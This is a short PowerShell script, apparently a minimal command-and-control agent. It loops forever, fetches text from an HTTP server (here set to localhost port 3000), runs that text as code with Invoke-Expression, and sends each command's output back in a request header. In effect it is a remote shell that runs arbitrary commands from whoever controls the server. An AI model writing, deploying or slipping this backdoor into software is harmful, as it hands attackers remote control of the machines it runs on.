$Uri = "http://127.0.0.1:3000/"
$Last_out = ""
while ($true) {
    try {
        $Data = @{
            out = ([string]($Last_out))
        }
        $Response = Invoke-WebRequest -Uri $Uri -Method Get -Headers $Data
        $Last_out = Invoke-Expression ([string]($Response.Content))
        if (!$Last_out) {
            $Last_out = ""
        }
    }
    catch {
        write-host $_ 
    }
}